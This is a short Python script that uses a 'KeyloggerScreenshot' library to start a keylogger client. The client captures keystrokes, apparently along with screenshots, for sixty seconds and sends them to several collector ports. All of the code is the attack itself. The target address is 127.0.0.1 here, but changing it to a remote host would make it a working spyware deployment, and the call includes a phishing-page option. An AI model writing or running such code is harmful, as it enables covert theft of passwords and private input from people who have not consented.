import KeyloggerScreenshot as ks 

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 5392, ip, 2496, ip, 6814, ip, 8917, duration_in_seconds=60, phishing_web=None) 
key_client.start()
